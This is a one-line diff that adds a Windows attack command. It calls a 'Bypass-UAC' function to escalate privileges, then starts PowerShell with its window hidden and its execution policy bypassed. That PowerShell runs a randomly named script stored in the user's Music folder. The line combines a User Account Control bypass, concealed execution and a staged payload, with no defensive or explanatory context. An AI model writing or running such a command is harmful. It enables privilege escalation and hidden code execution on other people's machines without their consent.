@@ -1,0 +1,1 @@
+Bypass-UAC -command "cmd.exe /k powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass c:/users/%username%/music/agjgwnl3.ps1"
